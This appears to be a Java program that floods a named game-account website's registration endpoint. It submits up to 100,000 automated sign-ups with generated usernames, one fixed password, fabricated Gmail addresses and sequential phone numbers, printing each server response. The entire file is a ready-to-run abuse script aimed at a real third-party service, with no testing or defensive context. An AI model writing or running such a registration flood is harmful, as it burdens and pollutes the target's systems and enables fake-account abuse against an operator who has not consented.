
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.Random;

/**
username:
password:
email:
fone:
 */
public class alte {

    public static void main(String[] argv) throws Exception {
        Random ran = new Random();
        int  u = ran.nextInt(1000);
        int z = ran.nextInt(1000);
        int v = ran.nextInt(1000);
        String k =z+"Xinh"+u+"Xan"+v;
        
        for (int i = 0; i < 100000; i++) {
            String data = URLEncoder.encode("username", "UTF-8") + "=" + URLEncoder.encode(k+i);
            data += "&" + URLEncoder.encode("password", "UTF-8") + "=" + URLEncoder.encode("kute12346");
 	    data += "&" + URLEncoder.encode("email", "UTF-8") + "=" + URLEncoder.encode("XinhXan"+i+k+"@gmail.com", "UTF-8");
            data += "&" + URLEncoder.encode("fone", "UTF-8") + "=" + URLEncoder.encode("09667066"+i, "UTF-8");
          
       // System.out.println("Gia Tri" +i +data);
            URL url = new URL("http://taikhoan.kiemthe19.com/account/register");
            URLConnection conn = url.openConnection();
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write(data);
            wr.flush();

            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
 	 	
	StringBuffer response = new StringBuffer();

        while ((line = rd.readLine()) != null) {
            response.append(line);
           System.out.println(line);
        }

 

            System.out.println(" OKe111112");
            wr.close();
            rd.close();
        }
    }
}
